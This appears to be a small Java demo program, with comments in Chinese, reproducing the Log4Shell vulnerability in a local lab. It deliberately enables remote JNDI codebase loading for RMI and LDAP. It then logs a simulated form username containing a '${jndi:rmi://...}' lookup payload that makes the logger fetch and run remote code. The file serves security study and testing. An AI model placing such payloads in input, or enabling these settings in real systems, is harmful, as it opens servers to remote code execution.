package com.iefihz.server;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * MyServer
 *
 * @author He Zhifei
 * @date 2021/12/24 22:22
 */
public class MyServer {

    private static final Logger LOGGER = LoggerFactory.getLogger(MyServer.class);

    public static void main(String[] args) {
        // 测试rmi服务器在其它工程时，较新的jdk1.8的版本需要设置这两个参数，默认是关闭的，1.8之前的版本不需要设置
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        // 假设通过前端表单输入用户名为：${jndi:rmi://127.0.0.1:8080/look}
        String username = "${jndi:rmi://127.0.0.1:8080/look}";
        LOGGER.info("用户名：{}", username);
    }
}
